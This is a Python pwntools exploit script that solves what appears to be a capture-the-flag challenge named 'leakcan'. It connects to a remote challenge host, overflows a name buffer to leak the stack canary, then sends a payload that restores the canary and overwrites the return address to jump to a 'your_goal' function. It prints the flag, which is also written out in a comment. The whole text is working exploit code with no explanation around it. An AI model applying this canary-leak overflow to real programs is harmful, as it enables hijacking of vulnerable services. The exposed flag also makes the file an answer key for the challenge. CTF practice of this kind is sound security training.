#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./leakcan_chall", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("leakcan-25b8ac0dd7fd.tcp.1753ctf.com", 8435)

p.sendlineafter(b"What's your name", b"A" * 0x58)
p.readline()
p.readline()
canary = u64(b"\x00" + p.recv(7))

payload = b""
payload += b"A" * 0x58
payload += p64(canary) + p64(0)
payload += p64(elf.sym["your_goal"])
p.sendline(payload)

p.readuntil(b"1753c{")
print("1753c{" + p.readuntil(b"}").decode()) # 1753c{c4n4ry_1f_th3r35_4_m3m_l34k}
